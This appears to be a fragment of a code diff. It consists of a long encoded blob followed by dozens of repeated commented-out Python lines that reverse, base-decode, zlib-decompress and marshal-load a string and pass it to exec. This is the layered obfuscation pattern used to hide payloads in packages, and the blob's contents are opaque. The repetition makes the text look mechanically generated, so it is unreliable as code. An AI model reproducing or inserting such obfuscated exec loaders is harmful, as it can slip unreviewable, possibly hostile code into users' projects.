J7W36FLCFDCF7FKZF4Q7CKOTZ5VPGSEKPQAKRXRT3VGRV5JJDPZ5IYUKMN6TN2GGYAHJVO534ARNAOERCSPYV4IUXMNIDEP7YJLYOKFAJ3FTWIZF45A6T5NN7DFIY3U42M6IIKQQLN63RG3ZCCZDDHZACA4VYR4DZ2QRSAQRNSHY5QMZRAN46SRFCOEBBHJFD4UUJOWBA4AKCCXZWM7F2S6VI5LRUPUSH6O2CYUMURU337VIROB37AUE3LXHV4HNT5HBAWQFPIND7Q5B2G6MA7W6CUTFMTDWBMYUI4UHH6YPEPXADYODEFIF3QSYZ4KKA45J3JQIID3EJPR76EVL7AA3IEXH724SEYIG3YF2RJB262ONFKPPSPAZQ5VL23T3D5FMXECPQXX3XBIQU7LSA4PK6GEP43VBGL4PI5OA3EODT2DY4D4UHSFQ5L6BAHWCK6YNAAR677S5D6N6YVE2SZL3LRHARSLSFDOXOBZ7OZEFDL4KHTROSZRLKKOA7Y5NRX2LHU2MAEMQTREMNVI6CGRVJA4N7ZEAGSDN7NKWQZUSCEWW3S66A467SW5DOF2A4HHVHMASLDMMQNJAWVH7REBK4PXFP7E27ED7T6L5EUSDWM774RYCZWFULUF7XGSUOAPWP57DPHG2OZTR2CXXII2KP7C2GZH4Z6IYCYRPJORG3Q6MYNP3VA7VROBSVNFNTXWZEGIBA2XSSB4DRWUK3NRZWWFYWXNWX46SWHICCF2UZGAHU7NP2WKYB5WVX2ZSOR7NWIXPE2SBJJZ6C2FUE3OVZCC3NFM3FHUXRBMSCUCAZV66RZ5PXLNJRSNNOOJAD46MSVVIAVKIZXKMVM2FFHRBQLEMYWGDTOXM2DN5NREDPIVVYM7VHMBCBF4WWPZBNRNTM63TNOQDYI35UAXALMYCBGVM2KO37HJNKPYD7A5AKGSPRW66I6KP3KZHYIWV3WYYB4V6M2RPID26IGHQSJOEJLAJESMQT65TQRABRAFVVPHL7IQYLP3C4A3VSJBVBYJRUBC32VKIDXMUG3ASMDX2FSX6FEELFCGSF6H2BIG5QQI7HXL44EEFJU6ZPYDSDNFU4DXKK2J4SCJHUNKMI56ON52EQNM4FQNLLDKUEUQ4XIXWX2HNU6XQFVQ5AKNGHEY5JMMDGZ5FVGGDGBQR2FIV6OGDHRIHLCQMHRTDPT37KZV3OSBY42TR7YCSKYDJVEEMPSVYDWTSXPEK36VKLYTAAIZYEHDM6KO7AQURTCXN6PQIUNDKPODPMLA4O5XAR7NUIIKTRCBHF5WL6BHZNBXBBUHSOZJ3XAWLTAUK72L23C6DLW7VBMRY6LIKXUUTPDLAFLD7L2REJX3X7N7FVGU7UY7WWBMVUQYCH25OYBJ62Z6XHCD26E6NC2NRUHULFU23IS6XESNMILWLDBES3VMB42IT7Y2MCADK2DINWWYVATSJ2YYFMTRWNHTK2ZMIF4FWDT3OD4KOE7OKYHLNQDSL5Z5WU3MARU2TT6Z5EEBGXTS27I6TJT7XZVVL7DNSM3LDSCL2HBA5PIX7ZIAZIIRRJIIS6BHNZ6LRORHGCZIY2BXW3JX4WBWYZGR4QBS3QNCY6LTLEGGWSSUBSX3NFNU27FO53B43444W6PV2XANIQZT436U5WGVTXY73EQWADN6ZMEFET5EYP7SPTPSNCKHVDE5WNKC7PZF3TJR6IERVBAU5P453SAQFBTLFKYVKSNNNDKFMGOXKGTIP4663N6LXBESMCTW6FAXMNBQXOJKPSH7S2A5GR3PI7X4CGB4DQNGUS4SEJOUXB27AEFJ55TVQZZURZAPMICPBAN5LTCKF5DOUIJBYCEXA62HDAZVXLJKCFB6TLDLZAO67ASTZBH6K744C4RMYHSVHUF2BMVEH3KGMDBFWUXLKFHJMKPEFTA3C6VTQIVJAH3JFKYNZFP7TDPJ54S5BGSPWGGQGY7HMEYOMMEZPTCL72S7IXJ77QQOSNXCLOBA7LXIBXQL74YZAY7FRYZDXDED6BBJWNJC5GLAE2NHFB5XARTOPJZ5QYEAH3DC5A5NCOYEI3HHQZGKINOV3UJ2KVTXCJA7CMXDRQP22FOGLLHYLD26DV3ATAJ4AGO6ILUWRMJZFJRBDFF3ZBJEM7SOXP5UZX7B3I4SYTRCQ7RQSKESL2YC5U5DCI2KYCQYSBV5GFBYDGWG2PDHXVTXOFDAC2OC6U3Q5LQLIJXOMEAOJMF4NHKHQKIXXA3EQT6IIQ45G7QO4YNVZ6KET2A56LUSUGAHIV7OKDBZARGBOTTHUHWBHSQRZRNVVNQUM4TNGAMHZDE4MSRAIU23QUQK2T63YCYRZICKUMKDOQOLA6MTPPDSYANXCU3MXCRTE7ETX3INIZ3DXXB3NPKRKFU3LGEV5XLGLKZQS7QIYCE33HVF3WLUE4ZLCWFZSMVVH4AM2DMWMNHNACGKJB2NV2NMN5RVW66QGSFL3VFASRXUNQHVO3DYIGXGEXRHN44F5PHDDN7HONRM77YNDM27324SNLPZE4JMYVT3Q7P22AO67DU33LBALVPODY7V2WSJEFGVILBGE2UL5FC3MCMDJ446R4E52MHGGYCABYLNLPR6MWLBQTLNFE7FI4FNVU4TRWTUTR4HVPFU5DKCOZUGRHYP5J4CYBQ3QHKRTPFPF72AEQWAMD35VP2IC4JFRYFN4XCAII7IEERXASYVKII4JMMPPWNE3M6FW5GYJFEDR5DB3QLKMQOCA2QODRBCCMTIYXP6D3GWBUWFJ3SLPC2AQMILN5GZXPDAATQ4GSIVRPS2CLEKCMGHAV4N7LX6P5H6UEH5X3SGA5ORZC3BTGW3RNIIQU24XPRGTJGU5DV6NWLTFG56YUAO6YOFVE4LDSISYEXJP7ZCS25J7L2XG6OYTAMNB2LCJJYQLZDNGTIJFWTUJWKQLSBJLIKJ3Q4AW7J65YAWADHIFQFWPDXFH2KDO7WSA4V2ASLTXAQXIW54D6NWV3EXFWN24DVSS3DXPLYWJE4WBNCS2BGPCGZV3RG5NBAOSWDETGR7RDQ2DEFJAS3LCXSBIT3AI46U4RQUXSPBBRLE54NTQXAXSXBF7THJ4OQXERJ7ZBEAQDJ5ABLFL2OVRR6BWB3PTPCPOVE3H3WMIOTKYEGOJRO5ELWH7AVCBS7WN6LHPIAZ5GAWT5NDNLLXZEIOI62CA7SHWSBJYVANAKFTBROSHMZT3P6JWEIVU5ZKLADYR3EFJHNYKA5ISEABVF6ETJRTFUNQP5K43MDGRJSZRNTYXYLKLZYEQ7JY2JYVLZDMQNF544SQ5WKXNYPL6IWUXJQFVIX2LQ6ZOAT2BU5HAZDCUY3OOTVZ25DN6HTEC7OSBFTEZQGJX3REZJ7225G2LWCO54BV67RFC43PHJOHQWZUNBOTBTFLVS4GLCO3FFY6KGNYIIH32LXTTIQOYWPAJRATPIU3IHAFH4BRTY4HCTZAWJCWX7HXKWCXT2WCEYRLSIBT63SQV3TLJ2VITNUH3CK6UCTI4RILVMULORBKRB7SCYGRCE5S3Y55LLDZAOA6DXBOS5HIANPNWMSGUW6VYZKCQOT4P4LQXGFMAHMKB63527PUYIHR6WAKZSRJX7UPNVKG4YH4JEAW2S65MUMUOQANPLIYKB3SCTZMBUZCCHZZEYKHLEFBCBZQOHQBEIZ7DE3BLLB4KCWRRKYMTCGCL3AULHAAAOWV7Y6J3B3UBCG52X33Q4ZFVWGBJVGFLBU3JOTVZVGT4ZRAJP4VPNUXPIXFAJ5ZHXV4JWFFOCL75PPHABATXIHLP5ZZ3ORUIU6PFCX3NWFA7BMPU4I24XRZATPLFD42OIDA3X65X6ILY3KKO33VY5HFPZXGH3MMGINBB3UBS224B2Y76PLQRQ7FJIRK3XFW73HFCAAL7Q4RMBGKIZO57UICEH4XRCJ2GKRLFGYJOEY5THP7BLLZJABWYYCJIFDQGK6CSJVZINL5EIVGBYIO3QSEPNNMEPM44CIN5NAWAQZYWCJJCCFPNK7M7DZY7OIWGD5NC6AA2UWTZXPU2LZOA3ESYV3BB6GBBIIIDVE2RCQMQYDAEHNCTN7ZG3CUABDL3LPTYIJAXGEXMJYZJBZYQF3U6VGDQZSYXJSFJYQYVRENE5TKI2AGPB3TM22FMPEKQSQ4BYXOPQUCQOMGS6NXGBMIOUR4ZS72DYF6NYKDZVLZHFULPEYHMTL2KQCY4M3QHFE5444MM5T2GL5ZW6HXIFKJHBNJXTX5XOANZMK2T6GVIKVEUNMACVECQIIOTAG64ZJPPVK5G45CXWLBT7MKCY5D7PTDQCCMVRCK4PPF7POENPUL63NHMWCI63IBMQYLKOWLGUTX7AXQUYE6OMZSQVURF2HZV3QQULANVGZD6U2VMYUHXKV7D65SNWVJN5YTHXSAUDLPJLENBFBSWP3L2JA7TOG7TTWUCG665RVXVUE3N7NMZHZIWOI5JDDZVH2R3RU65SIXLRXNSWO5WZC3ZAJZJ3POXUJR7IR4W7LSMMLJZZ7OTMQHJ7PL3YSMP2U74U7INBM456N4DM2TNFBJMMWUTPGBPMLBGV6SSI6LADYWM73CAJTSZTFKC7G7OPKY4P36XZ5DL3I6NUQYIANMW6CFWAD7EPX6G64BJ76QRJOKS5N4TXRJXFJO3Z2MWLI5DHN5FFHJ3U7BNOUCLX4T6HAQGLBKGGDZVRFOELQ4AVS2PZU2KAWM75TWMH3DP664LYZJNOEVXGFHF4DIS4UNCJ2LBXQIOL3WT5WXB72ADTKCHQKNYA76Z5KHPTKZH3YIILK7LOMLWXZAFNM6SRIAZXMSSLFJWQK7QA4OWJJUE7ULILKD2KUHLNQP7E3EX7SM3KUYANPCS5YMVV3WHA75BMB53O42PQJEPK4CEEXNJ72VZ74M6GELIGH4GIBNQ35QM2NFBGFQSLR43VPQNXOXKO42Q4Y46CN4OMEFIRYM3DY5KBP24TAFVR3B6C6YJKA6DDDDJDABGT2D4CQYNQSVWFFCBK7EVH55G6GSELP24I63RFSS335K5KXODK7VXKBMXUXFCYT7OQ4QDSCVTJRHTKGVCTXRWATO5C3E2M36UVS75OF3NS7FQ5WEKEG2WUQPAHTZVVGE47WJ3PN4GT4VNDOEK7GI45VWDXDTP5QV3C3ZMQKIDG3GRYKH7FPRNOG2FCIJVMZFIY62QOQQQXFP24OITAL2OOCF2236KGB6BEWHVGJYOUQPBUBEBXMHSVNKY6MLEEOY4S745BU4QLLJ5QBKGED5MN3W5EERW2SABW3H2TUAPUHB5TBIXLZV4VHTPE72WXUBZDVCL3HVF244PNTO52YAQY3EGPDIPPTUG4HRWWCIW7BD4E5CMCOEZE2IOCH7QTUWCFUSOPTP4KLCU6X4DC4LTHXFXDIZNFNLZ7AHGLQKMGAIK24I5XTZTT2XERIGZXFTNRH6KFZHB3F3IGP3EGDSDMTLOJKIVK6Y2EXPFIKK6OWSC27DPU46C3AVP3SCLX77YXET5FUD3UTZBREYGJ3TGTVG3NT26TXUP55KUMLL4JYXHCXBRYYL3YL5FD5HGC6P6QM6R7JF2GOJJ7SRUJ6TAKEJMGJ4FF5C6BF2CXT4K2MHHPQ3ISZD5USKENNWKOZHZMSW3RLKLNIJTTJEKXKP746IYETVVGKONVOS4HSZEJHRG4CK6EWNESWRTPVN7KNSJ6KDC2NCOFZL3J4THJTFKUJMOPJZERAGHS7NQV2QYXRV7ODJRKVERTHPB6GHZEUL4MND5J5QBARSJBNPBQQ7YJLGQCBP6PYTDJYG5HWXX5DY7SPPXFMUL5ESLOIBTL5EGK74JSU534DMRM6OPQBJCNMGB2PO6F4UMHHBRJJEBC6JXQI2X3N7DUKZJIYT3ZE44YZPP7S73GI2JKHTKBMFUVIMNHDBUQ2OKUFZY52UGC3GX6U76P3NYRTDS3OJINTOTCXILXIEVWKOZPGCHSGMOCBC6PRXWBDTUVQSYO7V5MUGR4ERVMQGGGLDKMLU5ZXB7QP3PJXXXYXKSSX2MCTSRP6ZZHJTH7IVAN7GPDL253X3S437N52Z3RJYOUI66C5AF3RZYEMIO2D4AXHB4THUP74YB4K3JTKLWLYMHO3ZI4LM2C64LVY35T5SEONOKZR6ZDR4STRIDJPF4BUQTYONC36SXZPJT55MN6D2TGQJICTCC24J654ZB5FSVGEQNX62D2PFBEGOXYDWBU5I2MGS6BZK73G6DPXW3OX7G3P56EDCFVHPRARKEHWRVAWZBGVEQLVC6PPWV7VZF76H5SSH7PKIU6SO7KLIOFTXP3CRGIAZ5E6PEJ2QRIGHKBOMHLHMUXYADDN4HOY7PUUXWB5O47K4LFCGGDWLEPABID77YCC4MOQDGXQPM5NEM6IMC7OXPUPWBS5Y35YJPEFGGZDYFFXDWYFF4653WTYTM4SHDDXU62YR2CKOYQHLOYXXHHBUCHL6VYR4RBWHYP2AHRSNODUJ7RCY4KYPBHR6B65JWPCH4NJYRXHXC64QZT7CG6KZKHS76OHOSLJUN5PHO457PX2773K775UYX7T5673HO637P5X67RP677ZR777RDH767PD7673H75X777P7IVZ775F4XPYQ77Z7777L57XHP577RT7755XSI6XYYZDDOKRF764V3PWMH2POJQAAU7T3FKOTOIKU7EELQ4TMAY3LQ624A3SZGCMASXSSDSXDORM3DDZMESRXEFA3TONIEXPXJAPFMBLV6V656F34WYVL6O3GOCP'))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
+#__import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
+#exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))"
+#__import__('base64').b32decode(__[::-1])
